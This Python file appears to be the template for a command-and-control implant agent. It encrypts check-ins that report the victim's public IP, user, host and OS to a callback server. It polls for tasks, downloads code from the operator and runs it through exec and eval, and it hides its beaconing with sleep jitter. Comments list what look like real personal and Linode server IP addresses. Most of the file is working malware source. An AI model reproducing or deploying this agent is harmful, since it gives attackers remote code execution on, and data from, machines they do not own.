#!/usr/bin/python3

import json
import base64
import requests
import time
import ast
import types
import math
import random
import socket
import struct
import platform
import os
import getpass
import threading
from pynput import keyboard
import re
import sys
# import Xlib
# import Xlib.display
import time
import subprocess
from subprocess import Popen, PIPE
import stat
from http.server import BaseHTTPRequestHandler, HTTPServer
from Crypto.Hash import SHA256, SHA512, SHA1, MD5, HMAC
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import unpad, pad
from Crypto.PublicKey import RSA
from base64 import b64decode, b64encode


# Global dict containing name and code of the dynamic functions loaded 

global dynfs
global result
global sudo
dynfs = {}
sudo = ""
responses = []
delegates = []
delegates_address = []
delegates_UUID = []
delegates_aswers = []
result = {}
break_function = False

# my ip 95.239.61.225
# linode 194.195.242.157
# linode 172.104.135.23
# linode 172.104.135.67

class Agent:
    Server = "callback_host"
    Port = "callback_port"
    URI = "/post_uri"
    PayloadUUID = "UUID_HERE"
    UUID = ""
    UserAgent = {"User-Agent"}
    HostHeader = "domain_front"
    Sleep = "callback_interval"
    Jitter = "callback_jitter"
    KillDate = "killdate"
    Script = ""
    encryption_key = "AESPSK"
    decryption_key = "AESPSK"


def agent_encoder(agent):
    if isinstance(agent, Agent):
        return {
            'Server': agent.Server,
            'Port': agent.Port,
            'URI': agent.URI,
            'PayloadUUID': agent.PayloadUUID,
            'UUID': agent.UUID,
            'UserAgent': agent.UserAgent,
            'HostHeader': agent.HostHeader,
            'Sleep': agent.Sleep,
            'Jitter': agent.Jitter,
            'KillDate': agent.KillDate,
            'Script': agent.Script,
            'encryption_key': agent.encryption_key,
            'decryption_key': agent.decryption_key,
        }
   

def encrypt_AES256(data, key=Agent.encryption_key):
    key = base64.b64decode(key)
    data = json.dumps(data).encode()
    h = HMAC.new(key, digestmod=SHA256)
    iv = get_random_bytes(16)  # generate a new random IV
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    ciphertext = cipher.encrypt(pad(data, 16))
    h.update(iv + ciphertext)
    return iv + ciphertext + h.digest()

def encrypt_code(data, key=Agent.encryption_key):
    key = base64.b64decode(key)
    data = data.encode()
    iv = get_random_bytes(16)  # generate a new random IV
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    ciphertext = cipher.encrypt(pad(data, 16))
    return iv + ciphertext

def decrypt_AES256(data, key=Agent.encryption_key):
    key = base64.b64decode(key)
    # Decode and remove UUID from the message first
    data = base64.b64decode(data)
    data = data[36:]
    # hmac should include IV
    mac = data[-32:]  # sha256 hmac at the end
    iv = data[:16]  # 16 Bytes for IV at the beginning
    message = data[16:-32]  # the rest is the message
    h = HMAC.new(key=key, msg=iv + message, digestmod=SHA256)
    h.verify(mac)
    decryption_cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    decrypted_message = decryption_cipher.decrypt(message)
    # now to remove any padding that was added on to make it the right block size of 16
    decrypted_message = unpad(decrypted_message, 16)
    return json.loads(decrypted_message)

def decrypt_code(data, key=Agent.encryption_key):
    key = base64.b64decode(key)
    iv = data[:16]  # 16 Bytes for IV at the beginning
    message = data[16:]  # the rest is the message
    decryption_cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    decrypted_message = decryption_cipher.decrypt(message)
    decrypted_message = unpad(decrypted_message, 16)
    return decrypted_message
   

def to64(data):
    serialized = data.encode('utf-8')
    base64_bytes = base64.b64encode(serialized)
    return base64_bytes.decode('utf-8')

def from64(data):
    response_bytes = data.encode('utf-8')
    response_decode = base64.b64decode(response_bytes)
    response_message = response_decode.decode('utf-8')
    return ast.literal_eval(response_message[36:])


def getIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

def getPublicIP():
    return requests.get('https://api.ipify.org').text

def send(response, uuid):

    if Agent.encryption_key != "":
        enc = encrypt_AES256(response)
        message = base64.b64encode(uuid.encode() + enc).decode("utf-8")
        x = requests.post(Agent.Server + ":" + Agent.Port + Agent.URI, data = message, headers=Agent.UserAgent)
        dec = decrypt_AES256(x.text)
        return dec

    else:
        serialized = json.dumps(response)
        message = to64(serialized)
        uuid = to64(uuid)
        x = requests.post(agent.Server + ":" + agent.Port + agent.URI, data = uuid + message, headers=agent.UserAgent)
        res = from64(x.text)
        return res

def checkin(agent):

    print("[+] CHECKIN")

    checkin_data = {    
        "action": "checkin",
        "ip": getPublicIP(),
        "os": platform.system() + " " + platform.release(),
        "user": getpass.getuser(),
        "host": socket.gethostname(),
        "domain": socket.getfqdn(),
        "pid": os.getpid(),
        "uuid": agent.PayloadUUID,
        "architecture": platform.architecture(),
        }


    res = send(checkin_data, Agent.PayloadUUID)

    agent.UUID = res['id']




def get_tasks():

    tasks = {
        'action': "get_tasking",
        'tasking_size': -1
    }

    task_list = send(tasks, agent.UUID)

    if task_list:
        if task_list["tasks"]:
            print("[+] New Tasks")
            for i, t in enumerate(task_list["tasks"]):
                print("\t{}) {}: {}".format(i,t["command"], t["parameters"]))
    
    
    if "delegates" in task_list:
        for m in task_list["delegates"]:
            delegates_aswers.append(m)

    return task_list




def reverse_upload(task_id, file_id):
    upload = {
        'action': "upload",
        'file_id': file_id,
        'chunk_size': 512000,
        'chunk_num': 1,
        'full_path': "",
        'task_id': task_id,
    }

    res = send(upload, agent.UUID)
    res = res['chunk_data']

    response_bytes = res.encode('utf-8')
    response_decode = base64.b64decode(response_bytes)
    code = response_decode.decode('utf-8')

    return code


def post_result():
    global responses
    global delegates
    global delegates_aswers

    response = {}
    if delegates:
        response = {
            'action': "post_response",
            'responses': responses,
            'delegates': delegates
        }
        responses = []
        delegates = []
        
    else:
        response = {
            'action': "post_response",
            'responses': responses
        }
        responses = []

    result = send(response, agent.UUID)

    if "delegates" in result:
        for m in result["delegates"]:
            delegates_aswers.append(m)

    return result


def execute_tasks(tasks):
    if tasks:
        for task in tasks['tasks']:
            execute(task)

    r = random.randint(0,1)
    if r < 0.5:
        r = -1
    else:
        r = 1

    sleep_time = int(agent.Sleep) + r*(int(agent.Sleep) * int(agent.Jitter) / 100)

    time.sleep(sleep_time / 5)

    post_result()



def run_in_thread(function, param_list, task):

    found = False

    for item in dynfs:
        
        if item == function:
            try:
                if agent.encryption_key == "":
                    exec(dynfs[item])
                else:
                    exec(decrypt_code(dynfs[item]))
                eval(function + "(" + str(param_list) + ")")
                found = True
            except Exception as e:
                print(traceback.format_exc())
                response = {
                        'task_id': task['id'],
                        "user_output": str(e),
                        'completed': False,
                        'status': 'error'
                    }
                responses.append(response)
    
    if found == False:
        try:
            eval(function + "(" + str(param_list) + ")")
        except Exception as e:
            print(traceback.format_exc())
            response = {
                    'task_id': task['id'],
                    "user_output": str(e),
                    'completed': False,
                    'status': 'error'
                }
            responses.append(response)


def execute(task):

    # Search in the dynamic functions first, so a command can be sobstituted through the load functionality
    function = str(task['command'])
    print("\n[+] EXECUTING " + function)

    param_list = "task['id'],"
    if task['parameters'] != '' and task['parameters'][0] == "{":
        parameters = ast.literal_eval(task['parameters'])
        for param in parameters:
            param_list += "ast.literal_eval(task['parameters'])['" + param + "'],"
    else:
        if task['parameters'] != '':
            param_list += "task['parameters'],"



    param_list = param_list[:-1]

    thread = threading.Thread(target=run_in_thread, args=(function, param_list, task))
    thread.start()




################################################################################################################

# The comment below will be sobstituted by the definition of the functions imported at creation time

# FUNCTIONS



################################################################################################################


# MAIN LOOP

agent = Agent()

uuid_file = "UUID.txt"

if os.path.isfile(uuid_file):
    # f = open(uuid_file, "r")
    # agent.UUID = f.read()
    pass

else:
    checkin(agent)
    print("\t UUID = " + agent.UUID)
    # f = open(uuid_file, "w")
    # f.write(agent.UUID)
    # f.close()


    # ip = getPublicIP()
    # if ip == "194.195.242.157" or ip == "172.104.135.23" or ip == "172.104.135.67":
    #     print("[+] P2P Server")
    #     p2p_server(1)

while True:

    tasks = get_tasks()

    execute_tasks(tasks)

    r = random.randint(0,1)
    if r < 0.5:
        r = -1
    else:
        r = 1

    sleep_time = int(agent.Sleep) + r*(int(agent.Sleep) * int(agent.Jitter) / 100)

    sleep_time = random.randint(0, int(sleep_time))

    # print("[SLEEPING " + str(sleep_time) + "]")
    time.sleep(sleep_time / 5)


